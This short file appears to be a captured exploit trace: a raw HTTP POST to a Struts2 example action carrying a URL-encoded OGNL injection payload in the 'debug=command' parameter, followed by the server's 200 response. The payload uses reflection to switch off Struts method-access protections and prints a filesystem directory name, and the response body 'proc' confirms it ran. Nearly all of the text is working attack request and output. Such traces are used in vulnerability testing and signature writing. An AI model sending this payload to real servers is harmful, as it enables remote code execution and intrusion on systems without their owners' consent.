+POST /struts2-16/example/HelloWorld.action? HTTP/1.1
+User-Agent: Java/1.8.0_45
+Host: 192.168.1.4:8080
+Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+Connection: keep-alive
+Content-type: application/x-www-form-urlencoded
+Content-Length: 510
+
+debug=command&expression=%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d%3dfalse%2c%23f%3d%23_memberAccess.getClass%28%29.getDeclaredField%28%22allowStaticMethodAccess%22%29%2c%23f.setAccessible%28true%29%2c%23f.set%28%23_memberAccess%2ctrue%29%2c%23genxor%3d%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%2c%23genxor.println%28%40java.io.File%40listRoots()%5b0%5d.listFiles()%5b20%5d.getName()%29%2c%23genxor.flush%28%29%2c%23genxor.close%28%29HTTP/1.1 200 OK
+Server: Apache-Coyote/1.1
+Set-Cookie: JSESSIONID=01795F8B36936EA19C0E9EFEE269736E; Path=/struts2-16/; HttpOnly
+Content-Type: text/plain;charset=ISO-8859-1
+Transfer-Encoding: chunked
+Date: Fri, 25 Sep 2015 08:00:11 GMT
+
+5
+proc
+
+0
+
